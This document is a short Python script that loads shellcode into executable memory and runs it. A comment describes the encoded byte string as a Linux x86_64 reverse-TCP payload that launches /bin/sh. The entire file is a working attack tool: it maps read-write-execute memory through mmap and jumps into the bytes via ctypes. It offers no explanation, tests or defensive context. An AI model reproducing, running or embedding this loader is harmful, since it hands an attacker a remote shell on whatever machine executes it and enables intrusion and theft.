#!/usr/bin/python3
import mmap
import ctypes

# Shellcode (Linux reverse tcp x86_64, execve("/bin/sh"))
shellcode = (b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x61\xbc\xb6\xfd\xc2\xd2\x9d\xde\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x0b\x95\xee\x64\xa8\xd0\xc2\xb4\x60\xe2\xb9\xf8\x8a\x45\xd5\x67\x63\xbc\x95\xd5\xbd\xd2\x9d\xdf\x30\xf4\x3f\x1b\xa8\xc2\xc7\xb4\x4b\xe4\xb9\xf8\xa8\xd1\xc3\x96\x9e\x72\xdc\xdc\x9a\xdd\x98\xab\x97\xd6\x8d\xa5\x5b\x9a\x26\xf1\x03\xd5\xd8\xd2\xb1\xba\x9d\x8d\x29\x35\x51\xaf\x95\x9a\x14\x38\x6e\xb9\xb6\xfd\xc2\xd2\x9d\xde")

def execute_shellcode(shellcode):
    # Create a RWX (read-write-execute) memory region using mmap
    shellcode_size = len(shellcode)
    mem = mmap.mmap(-1, shellcode_size, mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)

    # Write the shellcode into the mmap'd memory
    mem.write(shellcode)

    # Get the address of the mmap'd memory and cast to a function pointer
    addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))

    # Cast the address to a function pointer (CFUNCTYPE)
    shell_func = ctypes.CFUNCTYPE(None)(addr)

    print("Executing shellcode...")
    # Execute the shellcode
    shell_func()

# Run the shellcode
execute_shellcode(shellcode)
